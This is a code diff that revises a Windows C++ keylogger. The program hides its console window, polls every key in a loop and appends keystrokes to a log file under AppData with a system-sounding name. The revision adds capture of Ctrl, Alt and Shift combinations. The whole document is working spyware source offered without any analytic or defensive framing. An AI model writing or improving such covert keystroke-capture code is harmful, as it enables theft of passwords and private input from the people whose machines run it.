@@ -2,46 +2,46 @@
 #include <windows.h>
 #include <fstream>
 #include <string>
-bool keyWasDown[256]={false};
 using namespace std;
-void logKey(string key) {
-    std::ofstream logFile("C:\\Users\\Hadil\\AppData\\Roaming\\SystemLog\\log.txt", std::ios::app);
-    logFile<<key<<endl;
+bool keyWasDown[256]={false};
+void logKey(const string& key){
+    ofstream logFile("C:\\Users\\Hadil\\AppData\\Roaming\\SystemLog\\log.txt", ios::app);
+    logFile<<key;
     logFile.close();
 }
 int main(){
     ShowWindow(GetConsoleWindow(),SW_HIDE);
-    while(true){
-        
-        for (int i = 32; i <= 126; i++) {
-            SHORT keyState=GetAsyncKeyState(i);
-            bool isCurrentlyDown=(keyState & 0x8000)!=0;
-            if (isCurrentlyDown && !keyWasDown[i]){
-
-                string key;
-
-                switch (i) {
-                    case 13: key="[ENTER]"; break;
-                    case 32: key="[SPACE]"; break;
-                    case 9: key="[TAB]"; break;
-                    case 8: key="[BACKSPACE]"; break;
-                    case 27: key="[ESC]"; break;
+    while (true) {
+        bool ctrl=(GetAsyncKeyState(VK_CONTROL) & 0x8000);
+        bool shift=(GetAsyncKeyState(VK_SHIFT) & 0x8000);
+        bool alt=(GetAsyncKeyState(VK_MENU) & 0x8000);
+        for (int i = 8; i <= 126; i++) {
+            bool isDown = (GetAsyncKeyState(i) & 0x8000) != 0;
+            if (isDown && !keyWasDown[i]){
+                string keyStr;
+                switch (i){
+                    case 13: keyStr="[ENTER]"; break;
+                    case 9: keyStr="[TAB]"; break;
+                    case 8: keyStr="[BACKSPACE]"; break;
+                    case 27: keyStr="[ESC]"; break;
+                    case 32: keyStr="[SPACE]"; break;
                     default:
                         if (i>=32 && i<=126)
-                            key=static_cast<char>(i);
+                            keyStr=static_cast<char>(i);
                         else
-                            key="[UNKNOWN:"+to_string(i)+"]";
+                            keyStr="[KEY:" + to_string(i) + "]";
                         break;
                 }
-
-                logKey("User pressed: "+key);
+                string prefix;
+                if (ctrl)  prefix+="CTRL + ";
+                if (alt)   prefix+="ALT + ";
+                if (shift) prefix+="SHIFT + ";
+                logKey(prefix+keyStr);
                 keyWasDown[i]=true;
             }
-            else if (!isCurrentlyDown){
-                keyWasDown[i]=false;
-            }
-            Sleep(0.1);
+            if (!isDown) keyWasDown[i]=false;
         }
+        Sleep(1); 
     }
     return 0;
 }
